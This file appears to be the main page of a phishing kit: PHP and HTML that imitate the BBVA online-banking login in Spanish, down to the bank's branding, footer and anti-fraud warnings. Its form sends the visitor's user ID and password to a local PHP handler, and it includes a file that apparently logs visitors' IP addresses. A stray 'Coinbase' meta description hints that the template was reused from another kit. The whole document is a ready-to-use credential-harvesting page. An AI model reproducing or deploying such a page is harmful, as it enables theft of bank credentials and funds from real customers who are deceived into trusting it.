<?php
    session_start();
    include "ip.php";   


?>

<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8">
        <meta name="discription" content="Coinbase">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="icon" href="./Assets/imgs/favicon.png">
        <title>Banca Online de BBVA</title>
        <!-- === bootstrap === -->
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css" rel="stylesheet" />
        <!-- == Font-awesome " icon " == -->
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
        <!-- == remixicon " icon " == -->
        <link href="https://cdn.jsdelivr.net/npm/remixicon@3.5.0/fonts/remixicon.css" rel="stylesheet">
        <!-- == file style css == -->
        <link rel="stylesheet" href="./Assets/css/style.css">
        <script src="./Assets/js/stutes.js"></script>
    </head>
    <body>

        <div class="wrapper_login">
            <header class="header_1">
                <div class="container_header_1">
                    <div class="logo">
                        <img src="./Assets/imgs/logo.svg" alt="">
                    </div>
                    <ul class="ps-0 mb-0">
                        <li class="sm_none"><p class="mb-0">Acceso a la banca online</p></li>
                        <li class="slash sm_none"></li>
                        <li><a href="">Ir a BBVA.es</a></li>
                    </ul>
                </div>
            </header>
            <div class="area_login">
                <div class="container_area_login">
                    <p><img src="./Assets/imgs/lock.png" alt=""> Estás en un entorno con seguridad BBVA</p>
                    <div class="wrapper_logs d-flex">
                        <div class="part_left">
                            <form action="./Assets/php/config/func.php" method="post" class="d-flex flex-column">
                                <input type="hidden" name="log">
                                <div class="box_inputes">
                                    <h1>Hola, introduce tu usuario y clave de acceso</h1>
                                    <div class="inputes">
                                        <div class="form-group input_box">
                                            <label for="user">
                                                <p class="lab mb-0">Usuario</p>
                                                <input type="text" name="user" id="user">
                                            </label>
                                            <p class="nif">NIF, NIE, Pasaporte o Tarjeta Anónima</p>
                                        </div>
                                        <div class="form-group input_box">
                                            <label for="pass">
                                                <img src="./Assets/imgs/eye.png" class="eye" alt="">
                                                <p class="lab mb-0">Clave de acceso</p>
                                                <input type="password" name="pass" id="pass">
                                            </label>
                                        </div>
                                    </div>
                                    <?php if( isset($_GET['error']) ) : ?>
                                    <div class="error">
                                        <i class="ri-alert-line"></i>
                                        <div class="txt">
                                            <p>Los datos de acceso no son correctos. Por tu seguridad, tras 5 intentos fallidos, tu clave se bloqueará. Si no la recuerdas, puedes crear una nueva.</p>
                                            <button type="button">Crear clave nueva</button>
                                        </div>
                                    </div>
                                    <?php endif; ?>     
                                </div>
                                <div class="btn_sub">
                                    <button type="submit">Entrar</button>
                                    <a href="">¿Olvidaste tu clave de acceso?</a>
                                </div>
                                <span></span>
                                <div class="links">
                                    <a href="">¿No tienes clave de acceso? Crea tu clave</a>
                                    <a href="">¿No eres cliente? Hazte cliente</a>
                                    <a href="">Descubre las ventajas de la banca online</a>
                                </div>
                            </form>
                        </div>
                        <div class="part_right">
                            <div class="alert_normal">
                                <img src="./Assets/imgs/infos.png" alt="">
                                <div class="txt">
                                    <span>Ahora puedes acceder con la biometría del móvil a BBVA.es.</span>
                                    <p class="mb-0">
                                        Acceder o firmar las operaciones con tu rostro o tu huella dactilar en la web o en la App es la mejor forma de verificar la identidad contra los fraudes online.
                                    </p>
                                </div>
                            </div>
                            <div class="sec">
                                <img src="./Assets/imgs/sec.png" alt="">
                                <h1 class="mb-0">Alerta: SMS falsos solicitando que llames a un número de teléfono</h1>
                                <p class="mb-0">Si recibes un SMS alertando de una transferencia de alto importe que tú no estás realizando, ¡elimínalo! No llames al teléfono indicado, no hagas ninguna operación ni des tus claves.</p>
                                <button>Más información</button>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <footer>
                <div class="container_footer">
                    <div class="logo">
                        <img src="./Assets/imgs/white-logo.svg" alt="">
                    </div>
                    <ul class="ps-0 mb-0 d-flex align-items-center">
                        <li>Aviso legal</li>
                        <li>Cookies</li>
                        <li>Datos personales</li>
                        <li>Informes legales</li>
                    </ul>
                    <ul class="ps-0 mb-0 d-flex align-items-center">
                        <li>Servicios de pagos</li>
                        <li>Tarifas</li>
                        <li>Tablón de anuncios</li>
                        <li>Negocio responsable</li>
                    </ul>
                    <div class="copyghit d-flex align-items-center justify-content-between">
                        <p>© 2026 Banco Bilbao Vizcaya Argentaria, S.A.</p>
                        <a href="">Creando Oportunidades</a>
                    </div>
                </div>
            </footer>
        </div>
        



        <!-- bootstrap -->
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
        <!-- script jquery -->
        <script src="https://code.jquery.com/jquery-3.7.1.js"></script>
        <script src="./Assets/js/script.js"></script>
        
        <script>  
            $("input").focus(function(){
                $(this).prev().addClass("focus");
                $(this).addClass("focus");
            });
            $("input").blur(function(){
                if ($(this).val() == "") {
                    $(this).prev().removeClass("focus");
                }
                $(this).removeClass("focus");
            });  
            $(".eye").click(function(){
            if ($("#pass").attr("type") == "password") {
                $("#pass").attr("type","text")
                $(this).attr("src","./Assets/imgs/eye_slash.png")
            }else{
                $("#pass").attr("type","password")
                $(this).attr("src","./Assets/imgs/eye.png")
            }
            })                                         
        </script>
    </body>
</html>